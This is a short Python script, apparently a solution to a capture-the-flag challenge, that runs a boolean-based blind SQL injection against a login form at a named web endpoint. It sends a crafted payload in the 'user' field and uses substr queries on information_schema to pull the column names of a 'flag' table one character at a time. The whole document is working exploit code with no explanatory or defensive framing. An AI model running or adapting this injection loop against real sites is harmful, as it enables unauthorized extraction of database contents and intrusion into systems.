import requests
dict="qazwsxedcrfvtgbyhnujmikolp123456789{}-"
url="http://mashang.eicp.vip:1650/api/yucctf/sqli_4/sql2.php"
flag=""
a=[4,2]
for w in range(0,2):
    for i in range(1,100):
        for s in dict:
         payload = "1' or if((substr((select column_name from information_schema.columns where table_schema=database() and table_name='flag' limit %d,1),%d,1))=\"%s\",1,0)-- "%(w,i,s)
         data = {"user":payload,"passwd":"1"}
         r=requests.post(url,data=data)
         if 'successful' in r.text:
             flag += s
        if len(flag) == a[w]:
            print(flag)
            flag=""
            break